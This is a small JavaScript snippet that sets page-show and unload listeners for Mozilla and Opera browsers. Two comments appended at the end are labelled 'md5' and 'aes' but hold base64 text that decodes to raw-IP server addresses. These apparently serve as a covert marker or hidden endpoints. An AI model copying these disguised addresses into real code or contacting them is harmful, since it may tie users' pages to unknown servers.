if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzguMTM3LjE1LjEwMjo4MDA4LGh0dHA6Ly84LjEzNy4xNC4xOTM6ODAwOA==**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/